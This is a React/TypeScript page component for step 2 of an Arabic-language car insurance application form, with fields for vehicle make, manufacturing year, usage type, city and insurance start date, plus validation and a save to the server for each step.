import React, { useState } from "react";
import { useLocation } from "wouter";
import InsuranceHeader from "@/components/InsuranceHeader";
import InsuranceStepper from "@/components/InsuranceStepper";
import LoadingOverlay from "@/components/LoadingOverlay";
import StepLoadingScreen from "@/components/StepLoadingScreen";
import { trpc } from "@/lib/trpc";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { useVisitorGuard } from "@/hooks/useVisitorGuard";

export default function Step2VehicleInfo() {
  const [, navigate] = useLocation();
  const { sessionId, visitorIp, saveData, getStoredData } = useVisitorSession();
  const guard = useVisitorGuard(visitorIp);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);
  const stored = getStoredData();
  const [carMake, setCarMake] = useState<string>((stored.carMake as string) ?? "");
  const [carYear, setCarYear] = useState<string>((stored.carYear as string) ?? "");
  const [usageType, setUsageType] = useState<string>((stored.usageType as string) ?? "");
  const [city, setCity] = useState<string>((stored.city as string) ?? "");
  const [startDate, setStartDate] = useState<string>((stored.startDate as string) ?? "");
  const upsertMutation = trpc.insurance.upsert.useMutation();

  function validate() {
    const errs: Record<string, string> = {};
    if (!carMake.trim()) errs.carMake = "نوع المركبة مطلوب";
    if (!carYear || Number(carYear) < 1990 || Number(carYear) > new Date().getFullYear() + 1) errs.carYear = "سنة الصنع غير صحيحة";
    if (!usageType) errs.usageType = "نوع الاستخدام مطلوب";
    if (!city.trim()) errs.city = "مدينة الاستخدام مطلوبة";
    if (!startDate) errs.startDate = "تاريخ بداية التأمين مطلوب";
    setErrors(errs);
    return Object.keys(errs).length === 0;
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!validate()) return;
    setIsLoading(true);
    const data = { carMake, carYear, usageType, city, startDate };
    saveData(data);
    await upsertMutation.mutateAsync({ sessionId, visitorIp, ...data, currentStep: 3 });
    setTimeout(() => {
      setIsLoading(false);
      navigate("/insurance/step3");
    }, 800);
  }

  return (
    <div className="min-h-screen bg-gray-50 flex justify-center">
      <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
        <InsuranceHeader />
        <InsuranceStepper currentStep={2} />
        <main className="flex-1 px-4 py-5">
          <h2 className="text-base font-bold mb-4 text-gray-800">بيانات التأمين</h2>
          <form onSubmit={handleSubmit} noValidate>
            <div className="mb-3.5">
              <label className="block text-sm text-gray-600 mb-1">نوع المركبة</label>
              <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" placeholder="مثال: تويوتا كامري" value={carMake} onChange={e => setCarMake(e.target.value)} />
              {errors.carMake && <p className="text-red-500 text-xs mt-1">{errors.carMake}</p>}
            </div>
            <div className="mb-3.5">
              <label className="block text-sm text-gray-600 mb-1">سنة الصنع</label>
              <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" placeholder="مثال: 2020" type="number" value={carYear} onChange={e => setCarYear(e.target.value)} />
              {errors.carYear && <p className="text-red-500 text-xs mt-1">{errors.carYear}</p>}
            </div>
            <div className="mb-3.5">
              <label className="block text-sm text-gray-600 mb-1">نوع الاستخدام</label>
              <select className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500 bg-white" value={usageType} onChange={e => setUsageType(e.target.value)}>
                <option value="">اختر نوع الاستخدام</option>
                <option value="private">خصوصي</option>
                <option value="commercial">تجاري</option>
                <option value="ride">تطبيقات نقل الركاب</option>
              </select>
              {errors.usageType && <p className="text-red-500 text-xs mt-1">{errors.usageType}</p>}
            </div>
            <div className="mb-3.5">
              <label className="block text-sm text-gray-600 mb-1">مدينة الاستخدام</label>
              <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" placeholder="مثال: الرياض" value={city} onChange={e => setCity(e.target.value)} />
              {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
            </div>
            <div className="mb-5">
              <label className="block text-sm text-gray-600 mb-1">تاريخ بداية التأمين</label>
              <input className="w-full px-3 py-2.5 rounded-lg border border-gray-200 text-sm focus:outline-none focus:border-blue-500" type="date" value={startDate} onChange={e => setStartDate(e.target.value)} />
              {errors.startDate && <p className="text-red-500 text-xs mt-1">{errors.startDate}</p>}
            </div>
            <div className="flex gap-3">
              <button type="button" onClick={() => navigate("/insurance/step1")} className="flex-1 py-3.5 border border-gray-300 text-gray-600 rounded-xl font-bold text-base hover:bg-gray-50 transition-all">السابق</button>
              <button type="submit" className="flex-1 py-3.5 bg-blue-600 text-white rounded-xl font-bold text-base hover:bg-blue-700 active:scale-[0.98] transition-all">التالي</button>
            </div>
          </form>
        </main>
        <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
        <StepLoadingScreen show={isLoading} />
      </div>
    </div>
  );
}
